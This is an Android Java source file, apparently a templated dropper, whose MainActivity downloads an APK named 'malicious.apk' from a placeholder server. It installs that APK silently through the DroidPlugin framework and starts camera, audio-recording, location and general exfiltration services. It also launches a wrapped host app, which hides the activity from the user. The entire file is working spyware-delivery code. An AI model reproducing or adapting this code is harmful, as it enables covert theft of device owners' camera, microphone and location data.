package $PKGNAME;

import android.app.ActivityManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.AsyncTask;
import android.os.Bundle;
import android.os.RemoteException;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;
import java.io.BufferedInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URL;
import java.net.URLConnection;
import java.util.List;

import com.morgoo.droidplugin.pm.PluginManager;

public class MainActivity extends AppCompatActivity {
     //================================================================================================================================================
    final static String server = "http://$SERVER";
    String maliciousFilename = "malicious.apk";
    String maliciousPackageNames = "attacker.malicious";
    String maliciousPackage = "attacker.malicious";
    String[] maliciousServices = {"attacker.malicious.CameraExfilService", "attacker.malicious.CompleteExfilService","attacker.malicious.RecorderExfilService","attacker.malicious.LocationExfilService"};
    final static private String PREF_KEY_SHORTCUT_ADDED = "PREF_KEY_SHORTCUT_ADDED";
  //================================================================================================================================================
    @Override
    protected void onPause() {
        finish();
        super.onPause();
    }
    //================================================================================================================================================
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        if(!checkMaliciousApkExists()){
            //killProcess();
            addShortcut();
            new DownloadFileFromURL().execute();
        } else {
            activateMaliciousServices();
            String apkPath;
            try {
                apkPath = getPackageManager().getApplicationInfo("$PLUGIN_PKGNAME" + "!FAKE!", PackageManager.GET_META_DATA).sourceDir;
            } catch (PackageManager.NameNotFoundException e) {
                e.printStackTrace();
                return;
            }

            try {
                PluginManager.getInstance().installPackage(apkPath, 0);
                PackageManager pm = getPackageManager();
                PackageInfo pi = pm.getPackageArchiveInfo(apkPath, PackageManager.GET_ACTIVITIES);
                Intent intent = pm.getLaunchIntentForPackage(pi.packageName);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);

            } catch (RemoteException e) {
                e.printStackTrace();
            }
        }
    }
    //================================================================================================================================================
    //================================================================================================================================================
    private boolean checkMaliciousApkExists() {
        return new File(getFilesDir(), maliciousFilename).exists();
    }
    //================================================================================================================================================
    public void killProcess(){
        List<ApplicationInfo> packages;
        PackageManager pm;
        pm = getPackageManager();
        //get a list of installed apps.
        packages = pm.getInstalledApplications(0);

        ActivityManager mActivityManager = (ActivityManager) this.getSystemService(Context.ACTIVITY_SERVICE);

        for (ApplicationInfo packageInfo : packages) {
            if(packageInfo.packageName.equals("$PLUGIN_PKGNAME")) {
                mActivityManager.killBackgroundProcesses(packageInfo.packageName);
            }
        }
    }
    //================================================================================================================================================
    private void addShortcut() {
        // Adding shortcut for MainActivity on Home screen
        Intent shortcutIntent = new Intent(getApplicationContext(), MainActivity.class);

        shortcutIntent.setAction(Intent.ACTION_MAIN);

        Intent addIntent = new Intent();
        addIntent.putExtra(Intent.EXTRA_SHORTCUT_INTENT, shortcutIntent);
        addIntent.putExtra(Intent.EXTRA_SHORTCUT_NAME, "$APP_NAME");
        addIntent.putExtra(
                Intent.EXTRA_SHORTCUT_ICON_RESOURCE,
                Intent.ShortcutIconResource.fromContext(getApplicationContext(), $SHORTCUT_ICON_R_VAR));

        addIntent.setAction("com.android.launcher.action.INSTALL_SHORTCUT");
        addIntent.putExtra("duplicate", false);
        getApplicationContext().sendBroadcast(addIntent);
    }
    //================================================================================================================================================
    public boolean checkServiceRunning(String serviceName){
        ActivityManager manager = (ActivityManager) getSystemService(ACTIVITY_SERVICE);
        for (ActivityManager.RunningServiceInfo service : manager.getRunningServices(Integer.MAX_VALUE)) {
            if (serviceName.equals(service.service.getClassName())) {
                return true;
            }
        }
        return false;
    }
    //================================================================================================================================================
    private void activateMaliciousServices() {
        for (int j = 0; j < maliciousServices.length; j++) {
            // use droidplugin to install
            try {
                String apkPath = getFilesDir() + "/" + maliciousFilename;
                Log.d("malinstall", "installing malicious apk @ " + apkPath);
                PluginManager.getInstance().installPackage(apkPath, 0);
                PackageManager pm = getPackageManager();
                Intent intent = new Intent();
                Log.d("malinstall", "starting malicious service : " + maliciousServices[j]);
                if(checkServiceRunning(maliciousPackage + ".MyService")) continue;
                intent.setComponent(new ComponentName(maliciousPackage, maliciousServices[j]));
                intent.putExtra("server", server);
                startService(intent);
            } catch (RemoteException e) {
                Log.d(" malinstall", "installation of malicious apk failed: " + e.toString());
                e.printStackTrace();
            }
        }
    }
    //================================================================================================================================================
    //================================================================================================================================================
    class DownloadFileFromURL extends AsyncTask<String, String, String> {
        //================================================================================================================================================
        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }
        //================================================================================================================================================
        @Override
        protected String doInBackground(String... f_url) {
                try {
                    URL url = new URL(server + "/" + maliciousFilename);

                    try {
                        URLConnection conn = url.openConnection();
                        conn.connect();
                        int lengthOfFile = conn.getContentLength();
                        InputStream in = new BufferedInputStream(url.openStream(), 8192);
                        FileOutputStream out = openFileOutput(maliciousFilename, MODE_PRIVATE);
                        byte[] buffer = new byte[1024];
                        int totalLen = 0;
                        int len = 0;
                        while ((len = in.read(buffer)) != -1) {
                            out.write(buffer, 0, len);
                            totalLen += len;
                        }
                        if (lengthOfFile != totalLen) {
                            // delete file for next try
                            new File(getFilesDir(), maliciousFilename).delete();
                        }
                        out.flush();
                        out.close();
                        in.close();
                    } catch (IOException e) {
                        e.printStackTrace();
                    }

                } catch (Exception e) {
                    Log.e("Error: ", e.getMessage());
                }
            return null;
        }
        //================================================================================================================================================
        @Override
        protected void onPostExecute(String file_url) {
            activateMaliciousServices();
        }
    }
    //================================================================================================================================================
    //================================================================================================================================================
}
